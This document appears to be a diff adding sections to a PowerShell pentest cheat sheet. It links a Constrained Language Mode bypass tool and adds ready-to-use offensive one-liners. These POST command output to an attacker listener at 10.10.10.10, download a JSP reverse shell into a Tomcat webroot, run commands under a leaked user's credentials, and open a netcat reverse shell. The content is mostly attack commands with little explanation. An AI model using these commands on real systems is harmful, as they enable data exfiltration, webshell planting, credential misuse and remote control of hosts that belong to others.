@@ -13,3 +13,31 @@
 
 Bypass of CLM : https://github.com/padovah4ck/PSByPassCLM
 
+
+
+
+## Data exfiltration :
+
+```
+Invoke-WebRequest -Method POST -Body (whoami | Out-String) -Uri http://10.10.10.10:4444
+```
+
+## file upload
+
+```
+Invoke-WebRequest 'http://10.10.10.10/jsp-reverse.jsp' -OutFile c:\tomcat\apache-tomcat\webapps\ROOT\Eewoo8EiVufohkiTh1Duunue4.jsp
+```
+
+## Other user execution
+
+```
+$password = 'leaked-passowrd' | ConvertTo-SecureString -AsPlainText -force; $username='WINDEV\user';$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $password;
+Invoke-Command -Credential $cred -ComputerName . -ScriptBlock {Invoke-WebRequest -Method POST -Body (whoami | Out-String) -Uri http://10.10.10.10:4444}
+```
+
+## Other user execution reverse shell
+```
+Invoke-Command -Credential $cred -ComputerName . -ScriptBlock {Invoke-WebRequest -Method POST -Body (c:\users\user\nc.exe -e cmd.exe 10.10.10.10 443 2>&1 | Out-String) -Uri http://10.10.10.10:4444}
+```
+
+
